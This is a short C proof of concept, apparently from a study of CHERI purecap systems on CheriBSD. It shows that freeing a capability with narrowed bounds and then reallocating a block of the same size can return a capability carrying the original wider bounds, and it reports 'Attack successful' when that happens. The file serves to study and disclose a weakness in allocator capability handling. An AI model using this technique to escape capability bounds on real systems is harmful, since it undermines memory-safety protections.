#include <assert.h>
#include <cheriintrin.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include "xalloc_front.h"

#if !defined(__CHERI_PURE_CAPABILITY__)
#  error This example must be run on a CHERI purecap system
#endif

// On CheriBSD, if a capability's bounds include the base pointer to a
// `malloc`d block we can use `free` to recover the original capability. This
// is inherently fragile, and relies on the underlying malloc reusing memory
// (which CheriBSD's jemalloc currently does).

int main() {
    // malloc returns a capability C1 to a block 0..n bytes long
    uint8_t *c1 = malloc(16);
    // Separate out the pointer from the capability so that we can check it
    // later.
    ptraddr_t c1_addr = cheri_address_get(c1);

    // Derive a capability C2 with bounds 0..m where m < n
    uint8_t *c2 = cheri_bounds_set(c1, 8);
    c1 = NULL; // Be clear that we've lost access to C1.
    assert(cheri_tag_get(c2) && cheri_length_get(c2) == 8);

    // We first free C2...
    free(c2);
    // ...and then immediately allocate a block the same size as C1.
    uint8_t *c3 = malloc(16);
    // malloc returns a capability C3 that is identical to C1.
    if (cheri_tag_get(c3) && cheri_length_get(c3) == 16 && cheri_address_get(c3) == c1_addr) {
	printf("Attack successful\n");
    } else {
        printf("Attack unsuccessful\n");
    }
    return 0;
}
